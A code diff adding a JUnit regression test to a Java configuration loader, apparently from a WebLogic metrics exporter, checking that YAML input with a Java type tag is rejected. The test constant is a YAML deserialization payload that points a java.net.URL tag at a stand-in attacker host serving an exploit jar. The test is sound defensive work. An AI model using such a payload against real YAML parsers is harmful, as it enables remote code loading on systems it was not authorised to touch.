@@ -8,6 +8,7 @@ import java.io.ByteArrayInputStream;
 import com.meterware.simplestub.Memento;
 import com.meterware.simplestub.StaticStubSupport;
 import com.oracle.wls.exporter.domain.ExporterConfig;
+import com.oracle.wls.exporter.domain.YamlParserException;
 import com.oracle.wls.exporter.javax.HttpServletRequestStub;
 import com.oracle.wls.exporter.javax.ServletUtils;
 import org.junit.jupiter.api.Test;
@@ -22,6 +23,7 @@ import static org.hamcrest.Matchers.equalTo;
 import static org.hamcrest.Matchers.greaterThan;
 import static org.hamcrest.Matchers.instanceOf;
 import static org.hamcrest.Matchers.is;
+import static org.junit.jupiter.api.Assertions.assertThrows;
 
 /**
  * @author Russell Gold
@@ -67,6 +69,8 @@ class LiveConfigurationTest {
             "    prefix: new_\n" +
             "    key: name\n" +
             "    values: [sample1, sample2]\n";
+    private static final String CONFIG_WITH_JAVA_TYPE_TAG =
+            "queries: !!java.net.URL [\"http://attacker.example/exploit.jar\"]\n";
 
     @BeforeEach
     void setUp() throws Exception {
@@ -96,6 +100,11 @@ class LiveConfigurationTest {
     @Test
     void whenInitNotCalled_haveNoQueries() {
         assertThat(LiveConfiguration.hasQueries(), is(false));
+    }
+
+    @Test
+    void whenConfigurationStringContainsJavaTypeTag_rejectIt() {
+        assertThrows(YamlParserException.class, () -> LiveConfiguration.loadFromString(CONFIG_WITH_JAVA_TYPE_TAG));
     }
 
     @Test
